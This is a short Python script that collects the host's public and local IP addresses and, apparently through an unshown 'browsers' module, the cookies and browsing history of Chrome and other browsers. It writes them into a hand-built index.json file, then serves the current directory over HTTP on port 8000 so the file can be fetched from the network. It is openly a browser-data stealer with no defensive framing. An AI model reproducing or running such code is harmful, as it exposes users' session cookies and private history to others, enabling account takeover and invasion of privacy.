
import re
from http.server import HTTPServer, SimpleHTTPRequestHandler

from browsers import getBrowsersInfo
import net
PORT = 8000








def main():
    publicIP= net.getPublicIP()
    localIP = net.getLocalIP()
    browsers = getBrowsersInfo()
    httpd = HTTPServer((f"{localIP}", int(8000)), SimpleHTTPRequestHandler)
    
    with open("index.json", 'w') as archivo:
        archivo.write("{\n\t"+f"\"Public IP\": \"{publicIP}\",\n\t\"Local IP\": \"{localIP}\",\n\t\n\t\"Browsers\":"+"{\n\t\t")
        
        for browser in browsers:
            if browser == "Chrome":
                if browsers[browser][0] == None:
                    browsers[browser][0] = "None"

                archivo.write(f'"{browser}\": {{\n\t\t\t"Cookies\":{browsers[browser][0]},\n\t\t\t"History":{{\n')
            else:
                if browsers[browser][0] == None:
                    browsers[browser][0] = '"None"'

                archivo.write('},\n\t\t"'+browser+f'": {{\n\t\t\t"Cookies":{browsers[browser][0]},\n\t\t\t"History":{{\n' )
            index = 0
            for history in browsers[browser][1]:
                if index == 0:
                    archivo.write( f'"Entry{index}": {{"{history["datetime"]}": "{history["url"]}"}}' )

                else:
                    archivo.write( f',\n"Entry{index}": {{"{history["datetime"]}": "{history["url"]}"}}' )
                index+=1
            archivo.write("}")
        archivo.write("}\n}\n}")


    print("\nServing HTTP on localhost port " + str(8000) + f" (http://{localIP}:" + str(8000) + "/) ...")
    httpd.serve_forever()

        
if __name__ == "__main__":
    main()
